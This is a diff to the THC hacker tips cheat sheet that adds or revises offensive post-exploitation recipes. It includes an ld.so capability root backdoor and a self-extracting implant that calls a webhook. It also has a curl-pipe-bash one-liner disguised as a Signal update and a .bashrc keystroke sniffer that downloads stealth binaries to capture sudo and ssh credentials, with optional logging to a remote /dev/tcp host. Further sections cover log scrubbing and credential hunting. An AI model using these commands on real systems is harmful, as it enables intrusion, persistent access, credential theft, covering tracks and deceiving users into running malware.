@@ -75,6 +75,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Remote access an entire network](#backdoor-network)
    1. [Smallest PHP backdoor](#carriage-return-backdoor) 
    1. [Local Root backdoor](#ld-backdoor)
+   1. [Self-extracting implant](#implant)
 1. [Host Recon](#hostrecon)
 1. [Shell Hacks](#shell-hacks)
    1. [Shred files (secure delete)](#shred)
@@ -89,8 +90,8 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
       1. [cryptsetup](#crypto-filesystem)
       1. [EncFS](#encfs)
    1. [Encrypting a file](#encrypting-file)
-1. [SSH session sniffing and hijacking](#ssh-sniffing)
-   1. [Sniff a user's SHELL session with script](#ssh-sniffing-script)
+1. [Session sniffing and hijacking](#sniffing)
+   1. [Sniff a user's SHELL session](#session-sniffing)
    2. [Sniff all SHELL sessions with dtrace](#dtrace)
    2. [Sniff all SHELL sessions with eBPF](#bpf)
    1. [Sniff a user's outgoing SSH session with strace](#ssh-sniffing-strace)
@@ -230,8 +231,7 @@ echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.ba
 
 This requires root privileges and is an old Linux trick by over-mounting /proc/&lt;pid&gt; with a useless directory:
 ```sh
-hide()
-{
+hide() {
     [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
     _pid=${1:-$$}
     [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[THC] PID $_pid is now hidden"; return; }
@@ -602,21 +602,31 @@ More: [https://github.com/twelvesec/port-forwarding](https://github.com/twelvese
 <a id="iptables"></a>
 **3.iii.c Bouncing traffic with iptables**
 
-Use the host 192.168.0.100 as a Jump-Host: Forward any connection from anywhere to 192.168.0.100:53 onwards to 1.2.3.4:443.
+Bounce through a host/router without needing to run a userland proxy or forwarder:
 ```sh
-FPORT=53
-DSTIP=1.2.3.4
-DPORT=443
-echo 1 >/proc/sys/net/ipv4/ip_forward
+ipfwinit() {
+    echo 1 >/proc/sys/net/ipv4/ip_forward
+    echo 1 >/proc/sys/net/ipv4/conf/all/route_localnet
+    [ $# -le 0 ] && set -- "0.0.0.0/0"
+    while [ $# -gt 0 ]; do
+        iptables -t mangle -I PREROUTING -s "${1}" -p tcp -m addrtype --dst-type LOCAL -m conntrack ! --ctstate ESTABLISHED -j MARK --set-mark 1188 
+        shift 1
+    done
+    iptables -t mangle -D PREROUTING -j CONNMARK --restore-mark >/dev/null 2>/dev/null
+    iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
+    iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
+    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
+    iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
+}
+ipfwinit                             # Allow EVERY IP to bounce
+# ipfwinit "1.2.3.4/16" "6.6.0.0/16" # Only allow these SOURCE IP's to bounce
+```
 
-iptables -t mangle -C PREROUTING -j CONNMARK --restore-mark || iptables -t mangle -I PREROUTING -j CONNMARK --restore-mark
-iptables -t mangle -A PREROUTING -p tcp --dport ${FPORT:?} -m addrtype --dst-type LOCAL -j MARK --set-mark 1188 
-
-iptables -t nat -I PREROUTING -p tcp -m mark --mark 1188 -j DNAT --to ${DSTIP:?}:${DPORT:?}
-iptables -I FORWARD -m mark --mark 1188 -j ACCEPT
-
-iptables -t nat -I POSTROUTING -m mark --mark 1188 -j MASQUERADE
-iptables -t nat -I POSTROUTING -m mark --mark 1188 -j CONNMARK --save-mark
+Then set forwards like so:
+```sh
+ipfw 31337 144.76.220.20 22 # Bounce 31337 to segfault's ssh port.
+ipfw 31338 127.0.0.1 8080   # Bounce 31338 to the server's 8080 (localhost)
+ipfw 53 213.171.212.212 443 # Bounce 53 to gsrn-relay on port 443
 ```
 
 We use this trick to reach the gsocket-relay-network (or TOR) from deep inside firewalled networks.
@@ -626,7 +636,7 @@ GS_HOST=192.168.0.100 GS_PORT=53 ./deploy.sh
 ```
 ```sh
 # Access the target  
-GS_HOST=1.2.3.4: GS_PORT=443 gs-netcat -i -s ...
+GS_HOST=213.171.212.212 gs-netcat -i -s ...
 ```
 
 ---
@@ -1596,13 +1606,45 @@ curl http://127.0.0.1:8080/test.php -d 0="ps fax; uname -mrs; id"
 
 Stay root once you got root
 ```bash
-### Execute as root user
-setcap cap_setuid+ep /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
+setcap cap_setuid+ep /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 2>/dev/null \
+|| setcap cap_setuid+ep /lib64/ld-2.17.so 2>/dev/null \
+|| echo >&2 "FAILED. File not found"
 ```
 Become root
 ```bash
 ### Execute as non-root user
-/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
+p="python"
+command -v python3 >/dev/null && p="python3"
+[[ -f /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ]] && l="/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"
+[[ -f /lib64/ld-2.17.so ]] && l="/lib64/ld-2.17.so"
+exec "${l:?}" "$p" -c 'import os;os.setuid(0);os.execlp("bash", "kdaemon")'
+```
+
+<a id="implant"></a>
+**6.vi. Self-Extracting implant**
+
+Create a self-extracting shell-script using [mkegg.sh](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/blob/master/tools/mkegg.sh) (see source for examples).
+
+Simple example:
+```sh
+# Create implant 'egg.sh' containing the file 'foo'
+# and the directory 'warez'. When executing 'egg.sh' then
+# extract 'foo' and 'warez' and call 'warez/run/sh'
+./mkegg.sh egg.sh foo warez warez/run.sh
+```
+
+Real world examples are best:
+1. Create an implant that installs gsocket and calls our webhook on success:
+```sh
+./mkegg.sh egg.sh deploy-all.sh '(GS_WEBHOOK_KEY=e90d4b38-8285-490d-b5ab-a6d5c7c990a7 deploy-all.sh 2>/dev/null >/dev/null &)'
+# On the target system do: 'cat egg.sh | bash' or './egg.sh'
+```
+
+2. Rename `egg.sh` to `update-for-fools.txt` and upload as blob to [Signal's](https://www.signal.org/) GitHub repository.
+
+3. Don't fool people to update Signal using this command ❤️:
+```sh
+curl -fL https://github.com/signalapp/Signal-Desktop/files/15037868/update-for-fools.txt | bash
 ```
 
 <a id="hostrecon"></a>
@@ -1632,7 +1674,7 @@ find  / -xdev -type f -perm /6000  -ls 2>/dev/null
 ```
 
 Find all writeable directories:
-```sh
+```bash
 wfind() {
     local arr dir
 
@@ -1648,20 +1690,38 @@ wfind() {
 # Usage: wfind /etc /var /usr 
 ```
 
-Find local passwords (using noseyparker):
+Find local passwords (using [noseyparker](https://github.com/praetorian-inc/noseyparker)):
 ```sh
-curl -fsSL https://github.com/praetorian-inc/noseyparker/releases/download/v0.16.0/noseyparker-v0.16.0-x86_64-unknown-linux-gnu.tar.gz | tar xvfz - --transform="flags=r;s|.*/||" --no-anchored  --wildcards noseyparker && \
-./noseyparker scan . && \
-./noseyparker report
+curl -o np -fsSL https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static
+chmod 700 np && \
+./np scan . && \
+./np report --color=always | less -R
 ```
 (Or use [PassDetective](https://github.com/aydinnyunus/PassDetective) to find passwords in ~/.*history)
 
 Using `grep`:
 ```sh
 # Find passwords (without garbage).
-grep -HEronasir  '.{16}password.{,64}' .
+grep -HEronasi  '.{,16}password.{,64}' .
 # Find TLS or OpenSSH keys:
 grep -r -F -- " PRIVATE KEY-----" .
+```
+
+Find Subdomains or emails in files:
+```bash
+resolv() { while read -r x; do r="$(getent hosts "$x")" || continue; echo "${r%% *}"$'\t'"${x}"; done; }
+find_subdomains() {
+	local d="${1//./\\.}"
+	local rexf='[0-9a-zA-Z_.-]{0,64}'"${d}"
+	local rex="$rexf"'([^0-9a-zA-Z_]{1}|$)'
+	[ $# -le 0 ] && { echo -en >&2 "Extract sub-domains from all files (or stdin)\nUsage  : find_subdomains <apex-domain> <file>\nExample: find_subdomain .com | anew"; return; }
+	shift 1
+	[ $# -le 0 ] && [ -t 0 ] && set -- .
+	command -v rg >/dev/null && { rg -oaIN --no-heading "$rex" "$@" | grep -Eao "$rexf"; return; }
+	grep -Eaohr "$rex" "$@" | grep -Eo "$rexf"
+}
+# find_subdomain .foobar.com | anew | resolv
+# find_subdomain @gmail.com | anew
 ```
 
 ---
@@ -1706,10 +1766,12 @@ This will reset the logfile to 0 without having to restart syslogd etc:
 
 This will remove any line containing the IP `1.2.3.4` from the log file:
 ```sh
-xlog() {
-    local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"
-}
-xlog "1\.2\.3\.4" /var/log/auth.log
+xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
+```
+
+Examples:
+```sh
+# xlog "1\.2\.3\.4" /var/log/auth.log
 # xlog "${SSH_CLIENT%% *}" /var/log/auth.log
 # xlog "^2023.* thc\.org" foo.log
 ```
@@ -1757,10 +1819,12 @@ mount -o bind,ro /boot/backdoor.cgi /var/www/cgi/blah.cgi
 
 Needed for taking screenshots of X11 sessions (aka `xwd -root -display :0 | convert - jpg:screenshot.jpg`)
 ```bash
-U=$(id -u UserName) ### <-- Set UserName
-H="$(grep "$U" /etc/passwd | cut -d: -f6)"
-HOME="${H:-/tmp}" python3 -c "import os;os.setuid(${U:?});os.execl('/bin/bash', '-bash')"
-# change -bash to bash to not make this a login shell.
+# NAME="UserName"  ### <-- Set UserName
+U=$(id -u ${NAME:?}) \
+G=$(id -g ${NAME:?}) \
+&& H="$(grep "$U" /etc/passwd | cut -d: -f6)" \
+&& HOME="${H:-/tmp}" python3 -c "import os;os.setgid(${G:?});os.setuid(${U:?});os.execlp('bash', 'bash')"
+# change bash to -bash to make this a login shell.
 ```
 
 ---
@@ -1842,18 +1906,28 @@ openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.
 ```
 
 ---
-<a id="ssh-sniffing"></a>
-## 10. SSH Sniffing
-<a id="ssh-sniffing-script"></a>
-**10.i Sniff a user's SHELL session with script**
+<a id="sniffing"></a>
+## 10. Session sniffing and hijaking
+<a id="session-sniffing"></a>
+**10.i Sniff a user's SHELL session**
 
-A method to log the shell session of a user (who logged in via SSH).
+A 1-liner for `~/.bashrc` to sniff the user's keystrokes and save them to `~/.config/.pty/.@*`. Useful when not root and needing to capture the sudo/ssh/git credentials of the user. 
 
-The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
+Deploy: Cut & paste the following onto the target and follow the instructions:
 ```sh
-echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
+command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
+&& { mkdir -p ~/.config/.pty 2>/dev/null; :; } \
+&& curl -o ~/.config/.pty/pty -fsSL "https://bin.ajam.dev/$(uname -m)/Baseutils/script" \
+&& curl -o ~/.config/.pty/ini -fsSL "https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m)" \
+&& chmod 755 ~/.config/.pty/ini ~/.config/.pty/pty \
+&& echo -e '----------\n\e[0;32mSUCCESS\e[0m. Add the following line to \e[0;36m~/.bashrc\e[0m:\e[0;35m' \
+&& echo -e '[ -z "$LC_PTY" ] && [ -t0 ] && [[ "$HISTFILE" != *null* ]] && { ~/.config/.pty/ini -h && ~/.config/.pty/pty -V; } &>/dev/null && LC_PTY=1 exec ~/.config/.pty/ini -a "sshd: pts/0" ~/.config/.pty/pty -fqaec "exec -a -bash '"$(command -v bash)"'" -I ~/.config/.pty/.@pty-unix.$$\e[0m'
 ```
-Consider using [zap-args](#bash-hide-arguments) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
+
+- Combined with zapper to hide command options from the process list.
+- Requires `/usr/bin/script` from util-linux >= 2.37 (-I flag). We pull the static bin from [ajam](https://bin.ajam.dev). 
+- Consider using /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
+- Log in with `ssh -o "SetEnv LC_PTY=1"` to disable logging.
 
 <a id="dtrace"></a>
 **10.ii Sniff all SHELL sessions with dtrace - FreeBSD**
@@ -2018,7 +2092,8 @@ Many other services (for free)
 
 | OSINT Hacker Tools ||
 | --- | --- |
-| https://osint.sh | Free. Subdomain Finder, DNS History, Public S3 Buckets, Reverse IP, Certificate Search and much more |
+| https://api.c99.nl | Free: [Subdomain Finder](https://subdomainfinder.c99.nl), PAID: Phone-Lookup, CF Resolver, WAF Detector, IP2Host, and more...for $25/year. |  
+| https://osint.sh | Free. Subdomain Finder, DNS History, Public S3 Buckets, Reverse IP, Certificate Search, and more |
 | https://cli.fyi | Free. curl/json interface to many services. Try `curl cli.fyi/me` or `curl cli.fyi/thc.org`. |
 | https://check-your-website.server-daten.de | Free. TLS/DNS/Security check a domain. |
 | https://hackertarget.com/ip-tools/ | Free OSINT Service (Reverse IP, MTR, port scan, CMS scans, Vulnerability Scans, API support) |
@@ -2069,6 +2144,7 @@ OpSec
 5. [EFF](https://www.eff.org/) - Clever advise for freedom figthers.
 
 Exploits
+1. [ttyinject](https://github.com/hackerschoice/ttyinject) and [ptyspy](#10-session-sniffing-and-hijaking) for LPE.
 1. [SploitScan](https://github.com/xaitax/SploitScan) - Exploit Score & PoC search (by xaitax)
 1. [Traitor](https://github.com/liamg/traitor) - Tries various exploits/vulnerabilities to gain root (LPE)
 1. [PacketStorm](https://packetstormsecurity.com) - Our favorite site ever since we shared a Pizza with fringe[at]dtmf.org in NYC in 2000
@@ -2079,6 +2155,7 @@ System Information Gathering
 1. `curl -fsSL https://thc.org/ws | bash` - Show all domains hosted on a server + system-information
 1. https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS - Quick system informations for hackers.
 1. https://github.com/zMarch/Orc - Post-exploit tool to find local RCE (type `getexploit` after install)
+1. https://github.com/The-Z-Labs/linux-exploit-suggester - Suggest exploits based on versions on target system 
 1. https://github.com/efchatz/pandora - Windows: dump password from various password managers
 
 Backdoors
@@ -2100,8 +2177,9 @@ DDoS
 1. [DeepNet](https://github.com/the-deepnet/ddos) - we despise DDoS but if we had to then this would be our choice.
 
 Static Binaries / pre-compiled Tools
-1. https://github.com/Azathothas/Toolpacks/tree/main from [hysp project](https://github.com/metis-os/hysp-pkgs)
+1. https://bin/ajam.dev ([github](https://github.com/Azathothas/Toolpacks/tree/main), [hysp project](https://github.com/metis-os/hysp-pkgs))
 1. https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64
+2. https://lolbas-project.github.io/ (Windows)
 1. https://iq.thc.org/cross-compiling-exploits
 
 Phishing
@@ -2113,7 +2191,6 @@ Tools
 1. https://tmate.io/ - Share A screen with others
 
 Callback / Canary / Command & Control
-1. http://dnslog.cn
 1. https://app.interactsh.com
 1. https://api.telegram.org
 1. https://webhook.site
